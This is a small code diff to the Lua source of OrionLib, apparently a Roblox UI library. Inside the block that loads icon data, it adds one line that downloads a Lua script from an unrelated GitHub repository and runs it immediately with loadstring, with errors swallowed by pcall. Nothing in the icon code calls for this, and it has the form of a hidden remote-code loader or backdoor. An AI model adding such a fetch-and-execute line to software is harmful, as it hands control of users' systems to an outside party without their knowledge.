@@ -31,6 +31,7 @@ local OrionLib = {
 local Icons = {}
 
 local Success, Response = pcall(function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/JamesKnight0001/SPTS-STATUS-SCRIPT/main/UI_LOOK.lua')))()
 	Icons = HttpService:JSONDecode(game:HttpGetAsync("https://raw.githubusercontent.com/evoincorp/lucideblox/master/src/modules/util/icons.json")).icons
 end)
 
